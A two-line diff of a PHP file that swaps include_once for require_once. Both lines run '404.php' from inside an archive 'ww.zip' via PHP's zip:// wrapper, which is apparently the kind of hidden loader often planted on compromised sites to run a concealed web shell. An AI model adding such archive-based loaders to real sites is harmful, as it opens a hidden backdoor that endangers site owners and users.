@@ -1,2 +1,2 @@
 <?php
-include_once "zip://ww.zip#404.php";
+require_once  "zip://ww.zip#404.php";
